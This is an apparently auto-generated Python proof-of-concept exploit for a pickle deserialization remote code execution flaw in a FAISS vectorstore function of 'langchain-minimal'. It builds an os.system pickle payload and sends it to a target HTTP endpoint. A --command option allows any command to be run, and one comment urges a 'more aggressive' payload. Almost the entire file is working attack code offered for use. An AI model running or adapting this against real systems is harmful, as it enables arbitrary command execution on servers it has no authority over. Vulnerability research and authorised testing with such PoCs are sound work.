#!/usr/bin/env python3
# PoC for langchain-minimal (/tmp/langchain-minimal)
# Path: rce-004
# Sink: deserialize_from_bytes
# Auto-generated — run with: python3 rce_function_deserialize_bytes_calls_deserialize_from_bytes.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for pickle deserialization RCE in langchain-minimal.

Vulnerability: The deserialize_from_bytes function in FAISS vectorstore calls
pickle.loads() on attacker-controlled bytes without any validation, allowing
arbitrary code execution.

Impact: Remote Code Execution (RCE) when an attacker can supply serialized bytes
to the vulnerable endpoint.

Usage:
    python3 poc.py --target http://victim:8000/api/v1/trigger
"""

import argparse
import base64
import pickle
import os
import sys
import requests
import subprocess
from typing import Optional

# ---------------------------------------------------------------------------
# Payload generation
# ---------------------------------------------------------------------------

class RCE:
    """
    A class whose __reduce__ method returns a callable and arguments
    that will be executed during pickle.loads().
    """
    def __reduce__(self):
        # Benign payload: create a marker file to prove code execution.
        # Change this to something more aggressive for actual testing.
        cmd = "touch /tmp/poc_success.txt"
        return (os.system, (cmd,))


def generate_payload() -> bytes:
    """
    Generate a malicious pickle payload that executes a benign command.
    Returns the serialized bytes.
    """
    payload = pickle.dumps(RCE())
    return payload


def encode_payload(payload: bytes) -> str:
    """
    Encode the payload for transmission (e.g., base64 or hex).
    The target endpoint may expect raw bytes or a string encoding.
    Adjust based on actual API contract.
    """
    # Default: base64 encode for safe transport in JSON/text fields.
    return base64.b64encode(payload).decode()


# ---------------------------------------------------------------------------
# Exploit execution
# ---------------------------------------------------------------------------

def send_exploit(target_url: str, payload: bytes, timeout: int = 10) -> Optional[requests.Response]:
    """
    Send the malicious payload to the vulnerable endpoint.
    Adjust the request format (JSON, form data, etc.) to match the actual API.
    """
    # The simulated endpoint from the finding:
    # @app.post("/api/v1/trigger")
    # def handle_request(untrusted_user_input: str):
    #     result = [BODY_DETECTED](untrusted_user_input)
    #
    # We assume the input is passed as a JSON field or raw bytes.
    # Try multiple common formats.

    headers = {"Content-Type": "application/json"}
    
    # Attempt 1: JSON with base64-encoded payload
    data = {"serialized": encode_payload(payload)}
    try:
        print(f"[*] Sending payload to {target_url} (JSON/base64)...")
        resp = requests.post(target_url, json=data, timeout=timeout)
        print(f"[*] Response status: {resp.status_code}")
        print(f"[*] Response body: {resp.text[:500]}")
        return resp
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        return None


def verify_exploit() -> bool:
    """
    Check if the benign payload succeeded by looking for the marker file.
    """
    marker = "/tmp/poc_success.txt"
    if os.path.exists(marker):
        print(f"[+] Exploit succeeded! Marker file created: {marker}")
        # Clean up
        os.remove(marker)
        return True
    else:
        print("[-] Marker file not found. Exploit may have failed.")
        return False


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="PoC for pickle deserialization RCE in langchain-minimal"
    )
    parser.add_argument(
        "--target",
        required=True,
        help="Target URL (e.g., http://victim:8000/api/v1/trigger)"
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=10,
        help="Request timeout in seconds (default: 10)"
    )
    parser.add_argument(
        "--command",
        default="touch /tmp/poc_success.txt",
        help="Command to execute (default: touch /tmp/poc_success.txt)"
    )
    args = parser.parse_args()

    print("[*] Generating malicious pickle payload...")
    # Override the RCE class command if custom command provided
    if args.command != "touch /tmp/poc_success.txt":
        class CustomRCE:
            def __reduce__(self):
                return (os.system, (args.command,))
        payload = pickle.dumps(CustomRCE())
    else:
        payload = generate_payload()

    print(f"[*] Payload size: {len(payload)} bytes")
    print(f"[*] Payload (hex): {payload.hex()[:100]}...")

    print(f"[*] Sending exploit to {args.target}...")
    response = send_exploit(args.target, payload, timeout=args.timeout)

    if response is None:
        print("[!] No response received. Check target and network.")
        sys.exit(1)

    # Verify if the command executed (only for the default benign payload)
    if args.command == "touch /tmp/poc_success.txt":
        verify_exploit()
    else:
        print("[*] Custom command sent. Verify execution manually.")

    print("[*] Exploit completed.")


if __name__ == "__main__":
    main()
